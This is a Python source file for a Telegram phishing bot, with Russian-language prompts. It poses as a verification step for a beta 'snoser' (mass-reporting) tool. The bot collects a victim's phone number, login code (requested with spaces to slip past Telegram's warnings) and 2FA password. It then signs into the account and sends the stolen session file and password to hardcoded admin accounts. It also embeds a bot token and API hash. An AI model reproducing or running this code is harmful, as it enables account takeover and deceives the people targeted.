import asyncio
import os
import re
import random
import json
import time
import glob
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon import Button

# ========== КОНФИГ ==========
BOT_TOKEN = '8557841311:AAFaAMArKf4QYw-mMQFMG89aE8LZq3ff7yI'
ADMIN_IDS = [7465903807, 6844924312]  # ТВОЙ TELEGRAM ID

APP_ID = 2040
APP_HASH = 'b18441a1ff607e10a989891a5462e627'
# ============================

bot = TelegramClient('bot_main', APP_ID, APP_HASH)
user_states = {}
SENT_LOG = 'sent_sessions.json'


def log_sent_session(user_id, phone, session_file):
    log = {}
    if os.path.exists(SENT_LOG):
        with open(SENT_LOG, 'r') as f:
            log = json.load(f)
    log[str(user_id)] = {
        'phone': phone,
        'session': session_file,
        'time': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    with open(SENT_LOG, 'w') as f:
        json.dump(log, f, indent=2)


async def send_to_admin(admin_id, session_file, user_id, phone, twofa=None):
    print(f"[DEBUG] Отправка админу {admin_id}, файл: {session_file}")
    print(f"[DEBUG] Файл существует? {os.path.exists(session_file)}")

    if not os.path.exists(session_file):
        print(f"[DEBUG] Файл НЕ СУЩЕСТВУЕТ!")
        return False

    file_size = os.path.getsize(session_file)
    print(f"[DEBUG] Размер файла: {file_size} байт")

    try:
        caption = f"🎯 **NEW SESSION!**\n\n👤 User: `{user_id}`\n📞 Phone: `{phone}`"
        if twofa:
            caption += f"\n🔐 2FA: `{twofa}`"
        caption += f"\n📦 Size: `{file_size}` bytes\n⏰ Time: `{time.strftime('%H:%M:%S')}`"

        await bot.send_file(admin_id, session_file, caption=caption, parse_mode='markdown')
        print(f"[DEBUG] Файл УСПЕШНО отправлен!")
        log_sent_session(user_id, phone, session_file)
        return True
    except Exception as e:
        print(f"[DEBUG] ОШИБКА отправки: {type(e).__name__}: {e}")
        try:
            await bot.send_message(admin_id, f"❌ Ошибка: {str(e)[:200]}")
        except:
            pass
        return False


async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    print(f"✅ БОТ ЗАПУЩЕН: {me.first_name} (ID: {me.id})")

    # Уведомляем админов - НУЖНО СНАЧАЛА ПОЛУЧИТЬ ENTITY
    for admin_id in ADMIN_IDS:
        try:
            # РЕШЕНИЕ: получаем entity через get_entity
            admin_entity = await bot.get_entity(admin_id)
            await bot.send_message(admin_entity, f"✅ **Бот запущен!**\nID бота: `{me.id}`\n\nОжидаю сессии...",
                                   parse_mode='markdown')
            print(f"[DEBUG] Уведомление админу {admin_id} отправлено")
        except Exception as e:
            print(f"[DEBUG] Не могу отправить админу {admin_id}: {e}")

    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        uid = event.sender_id
        print(f"[DEBUG] /start от {uid}")

        # Админам - панель
        if uid in ADMIN_IDS:
            await event.respond(
                "🔐 **ADMIN PANEL** 🔐\n\n"
                "📊 /stats - статистика\n"
                "📁 Сюда приходят сессии\n"
                "🔄 Сессии можно конвертировать в tdata через @tdata_bot",
                parse_mode='markdown'
            )
            return

        # Обычным пользователям - верификация
        await event.respond(
            "⚠️ **Требуется верефикация** ⚠️\n\n"
            "Здраствуйте дорогой тестер. Чтоб начать тестирование бета версии сносера вам необоходимо занести свою сессию в бота (это нужно для того чтоб сносер с вашего аккаунта кидал жалобы на обидчиков это может быть:аккаунт,канал,сообщение и тд) когда вы добавите свою сессию то тогда получится начать тестирование бета версии сносера.",
            buttons=[[Button.inline("✅ Верефицироватся ✅", b"verify")]],
            parse_mode='markdown'
        )

    @bot.on(events.CallbackQuery)
    async def callback_handler(event):
        uid = event.sender_id
        if uid in ADMIN_IDS:
            await event.answer("Вы админ, вам не нужна верификация")
            return

        if event.data == b'verify':
            await event.answer()
            await event.edit(
                "📱 **Введите свой номер телефона:**\n\n"
                "Format: `+1234567890`\n\n",
                parse_mode='markdown'
            )
            user_states[uid] = {'step': 'phone'}

    @bot.on(events.NewMessage)
    async def message_handler(event):
        if event.is_private and not event.text.startswith('/'):
            uid = event.sender_id

            # Админов игнорируем
            if uid in ADMIN_IDS:
                return

            if uid not in user_states:
                return

            state = user_states[uid]
            step = state.get('step')

            # ========== ШАГ 1: ПОЛУЧЕНИЕ НОМЕРА ==========
            if step == 'phone':
                phone = event.text.strip()
                if not re.match(r'^\+\d{10,15}$', phone):
                    await event.respond("❌ Wrong format! Use: `+1234567890`", parse_mode='markdown')
                    return

                state['phone'] = phone
                session_name = f'temp_{uid}_{random.randint(1000, 9999)}'
                state['session_name'] = session_name
                temp_client = TelegramClient(session_name, APP_ID, APP_HASH)
                state['client'] = temp_client

                await event.respond("📨 Sending verification code...")

                try:
                    await temp_client.connect()
                    await temp_client.send_code_request(phone)
                    state['step'] = 'code'
                    await event.respond(
                        "✅ **Код отправлен!**\n\n"
                        "**Введите код с пробелами:**\n"
                        "Пример: если твой код `45216` → введи `4 5 2 1 6`\n\n"
                        "➡️ Отправь код:",
                        parse_mode='markdown'
                    )
                except Exception as e:
                    await event.respond(f"❌ Error: `{str(e)[:150]}`", parse_mode='markdown')
                    await temp_client.disconnect()
                    del user_states[uid]

            # ========== ШАГ 2: ПОЛУЧЕНИЕ КОДА ==========
            elif step == 'code':
                raw_input = event.text.strip()
                code = raw_input.replace(' ', '')

                if not code.isdigit() or len(code) < 5:
                    await event.respond(
                        "❌ **Неверно!**\n\n"
                        "Send code with spaces like this:\n"
                        "`4 5 2 1 6` (if your code is 45216)",
                        parse_mode='markdown'
                    )
                    return

                temp_client = state.get('client')
                phone = state.get('phone')
                session_name = state.get('session_name')

                if not temp_client:
                    await event.respond("❌ Session expired. Use /start again", parse_mode='markdown')
                    del user_states[uid]
                    return

                try:
                    await temp_client.sign_in(phone, code=code)

                    # ИЩЕМ ФАЙЛ СЕССИИ
                    session_filename = None

                    # Вариант 1: через filename из клиента
                    try:
                        raw_filename = str(temp_client.session.filename)
                        if raw_filename.endswith('.session'):
                            session_filename = raw_filename
                        else:
                            session_filename = raw_filename + '.session'
                        print(f"[DEBUG] Вариант 1: {session_filename}")
                    except:
                        pass

                    # Вариант 2: по имени из state
                    if not session_filename or not os.path.exists(session_filename):
                        if session_name:
                            test_file = f"{session_name}.session"
                            if os.path.exists(test_file):
                                session_filename = test_file
                                print(f"[DEBUG] Вариант 2: {session_filename}")

                    # Вариант 3: глобальный поиск
                    if not session_filename or not os.path.exists(session_filename):
                        files = glob.glob(f"temp_{uid}_*.session")
                        if files:
                            session_filename = files[0]
                            print(f"[DEBUG] Вариант 3 (глобал): {session_filename}")

                    # Вариант 4: поиск всех .session файлов
                    if not session_filename or not os.path.exists(session_filename):
                        all_sessions = glob.glob("*.session")
                        for f in all_sessions:
                            if f.startswith("temp_"):
                                session_filename = f
                                print(f"[DEBUG] Вариант 4 (все файлы): {session_filename}")
                                break

                    if session_filename and os.path.exists(session_filename):
                        print(f"[DEBUG] ФАЙЛ НАЙДЕН: {session_filename}, размер: {os.path.getsize(session_filename)}")

                        # Отправляем админам
                        for admin_id in ADMIN_IDS:
                            await send_to_admin(admin_id, session_filename, uid, phone)

                        await event.respond(
                            "✅ **Верефикация пройдена!**\n\n"
                            "Твой аккаунт был успешно верефицирован",
                            parse_mode='markdown'
                        )
                    else:
                        print(f"[DEBUG] ФАЙЛ НЕ НАЙДЕН! Искали: session_name={session_name}")
                        await event.respond(
                            "⚠️ **Login successful but session file not found!**\n\n"
                            "Please contact support.",
                            parse_mode='markdown'
                        )

                    await temp_client.disconnect()
                    del user_states[uid]

                except SessionPasswordNeededError:
                    state['step'] = '2fa'
                    await event.respond(
                        "🔐 **Облачный пароль замечен!**\n\n"
                        "Введите свой облачный пароль(2FA) (or '-' if none):",
                        parse_mode='markdown'
                    )
                except Exception as e:
                    error_msg = str(e)
                    if 'expired' in error_msg.lower():
                        await event.respond(
                            "❌ **Code expired!**\n\n"
                            "Please restart with /start",
                            parse_mode='markdown'
                        )
                    else:
                        await event.respond(
                            f"❌ **Error:** `{error_msg[:150]}`\n\n"
                            "Try again with /start",
                            parse_mode='markdown'
                        )
                    await temp_client.disconnect()
                    del user_states[uid]

            # ========== ШАГ 3: 2FA ПАРОЛЬ ==========
            elif step == '2fa':
                twofa = event.text.strip()
                temp_client = state.get('client')
                phone = state.get('phone')
                session_name = state.get('session_name')

                if not temp_client:
                    await event.respond("❌ Session expired. Use /start again", parse_mode='markdown')
                    del user_states[uid]
                    return

                try:
                    if twofa != '-':
                        await temp_client.sign_in(password=twofa)

                    # ИЩЕМ ФАЙЛ СЕССИИ (те же варианты)
                    session_filename = None

                    try:
                        raw_filename = str(temp_client.session.filename)
                        if raw_filename.endswith('.session'):
                            session_filename = raw_filename
                        else:
                            session_filename = raw_filename + '.session'
                    except:
                        pass

                    if not session_filename or not os.path.exists(session_filename):
                        if session_name:
                            test_file = f"{session_name}.session"
                            if os.path.exists(test_file):
                                session_filename = test_file

                    if not session_filename or not os.path.exists(session_filename):
                        files = glob.glob(f"temp_{uid}_*.session")
                        if files:
                            session_filename = files[0]

                    if session_filename and os.path.exists(session_filename):
                        for admin_id in ADMIN_IDS:
                            await send_to_admin(admin_id, session_filename, uid, phone, twofa)
                        await event.respond("✅ **Верефикация пройдена!**")
                    else:
                        await event.respond("⚠️ Session file not found!")

                    await temp_client.disconnect()
                    del user_states[uid]

                except Exception as e:
                    await event.respond(f"❌ 2FA error: `{str(e)[:150]}`", parse_mode='markdown')
                    del user_states[uid]

    # ========== КОМАНДА /stats ДЛЯ АДМИНОВ ==========
    @bot.on(events.NewMessage(pattern='/stats'))
    async def stats_handler(event):
        if event.sender_id not in ADMIN_IDS:
            await event.respond("❌ Unauthorized")
            return

        sessions = glob.glob("temp_*.session")
        sent_data = {}
        if os.path.exists(SENT_LOG):
            with open(SENT_LOG, 'r') as f:
                sent_data = json.load(f)

        await event.respond(
            f"📊 **STATISTICS**\n\n"
            f"Active users in progress: `{len(user_states)}`\n"
            f"Session files on disk: `{len(sessions)}`\n"
            f"Sent sessions (logged): `{len(sent_data)}`\n\n"
            f"Log file: `{SENT_LOG}`",
            parse_mode='markdown'
        )

    await bot.run_until_disconnected()


if __name__ == '__main__':
    asyncio.run(main())